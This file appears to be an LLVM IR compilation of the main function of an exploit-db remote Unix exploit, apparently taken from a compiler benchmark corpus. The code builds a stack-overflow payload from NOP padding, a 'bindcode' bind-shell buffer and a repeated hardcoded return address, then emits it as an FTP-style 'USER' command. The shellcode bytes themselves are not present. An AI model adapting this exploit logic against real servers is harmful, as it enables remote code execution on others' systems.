; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20395.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20395.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SIZE = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@buffer = common dso_local global i8* null, align 8
@bindcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [9 x i8] c"USER %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  store i32 0, i32* %7, align 4
  %9 = load i32, i32* %3, align 4
  %10 = icmp sgt i32 %9, 1
  br i1 %10, label %11, label %16

11:                                               ; preds = %2
  %12 = load i8**, i8*** %4, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 1
  %14 = load i8*, i8** %13, align 8
  %15 = call i32 @atoi(i8* %14)
  store i32 %15, i32* %7, align 4
  br label %16

16:                                               ; preds = %11, %2
  %17 = load i32, i32* %7, align 4
  %18 = add i32 -1073744129, %17
  %19 = zext i32 %18 to i64
  store i64 %19, i64* %8, align 8
  store i32 0, i32* %5, align 4
  br label %20

20:                                               ; preds = %31, %16
  %21 = load i32, i32* %5, align 4
  %22 = load i32, i32* @SIZE, align 4
  %23 = sdiv i32 %22, 3
  %24 = icmp slt i32 %21, %23
  br i1 %24, label %25, label %34

25:                                               ; preds = %20
  %26 = load i8, i8* @NOP, align 1
  %27 = load i8*, i8** @buffer, align 8
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  store i8 %26, i8* %30, align 1
  br label %31

31:                                               ; preds = %25
  %32 = load i32, i32* %5, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %5, align 4
  br label %20

34:                                               ; preds = %20
  store i32 0, i32* %6, align 4
  br label %35

35:                                               ; preds = %50, %34
  %36 = load i32, i32* %6, align 4
  %37 = load i8*, i8** @bindcode, align 8
  %38 = call i32 @strlen(i8* %37)
  %39 = icmp slt i32 %36, %38
  br i1 %39, label %40, label %55

40:                                               ; preds = %35
  %41 = load i8*, i8** @bindcode, align 8
  %42 = load i32, i32* %6, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = load i8*, i8** @buffer, align 8
  %47 = load i32, i32* %5, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i8, i8* %46, i64 %48
  store i8 %45, i8* %49, align 1
  br label %50

50:                                               ; preds = %40
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %5, align 4
  %53 = load i32, i32* %6, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %6, align 4
  br label %35

55:                                               ; preds = %35
  br label %56

56:                                               ; preds = %95, %55
  %57 = load i32, i32* %5, align 4
  %58 = load i32, i32* @SIZE, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %98

60:                                               ; preds = %56
  %61 = load i64, i64* %8, align 8
  %62 = and i64 %61, 255
  %63 = trunc i64 %62 to i8
  %64 = load i8*, i8** @buffer, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  store i8 %63, i8* %67, align 1
  %68 = load i64, i64* %8, align 8
  %69 = and i64 %68, 65280
  %70 = ashr i64 %69, 8
  %71 = trunc i64 %70 to i8
  %72 = load i8*, i8** @buffer, align 8
  %73 = load i32, i32* %5, align 4
  %74 = add nsw i32 %73, 1
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %72, i64 %75
  store i8 %71, i8* %76, align 1
  %77 = load i64, i64* %8, align 8
  %78 = and i64 %77, 16711680
  %79 = ashr i64 %78, 16
  %80 = trunc i64 %79 to i8
  %81 = load i8*, i8** @buffer, align 8
  %82 = load i32, i32* %5, align 4
  %83 = add nsw i32 %82, 2
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  store i8 %80, i8* %85, align 1
  %86 = load i64, i64* %8, align 8
  %87 = and i64 %86, 4278190080
  %88 = ashr i64 %87, 24
  %89 = trunc i64 %88 to i8
  %90 = load i8*, i8** @buffer, align 8
  %91 = load i32, i32* %5, align 4
  %92 = add nsw i32 %91, 3
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %90, i64 %93
  store i8 %89, i8* %94, align 1
  br label %95

95:                                               ; preds = %60
  %96 = load i32, i32* %5, align 4
  %97 = add nsw i32 %96, 4
  store i32 %97, i32* %5, align 4
  br label %56

98:                                               ; preds = %56
  %99 = load i8*, i8** @buffer, align 8
  %100 = load i32, i32* @SIZE, align 4
  %101 = sub nsw i32 %100, 1
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %99, i64 %102
  store i8 0, i8* %103, align 1
  %104 = load i8*, i8** @buffer, align 8
  %105 = call i32 @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i8* %104)
  ret void
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
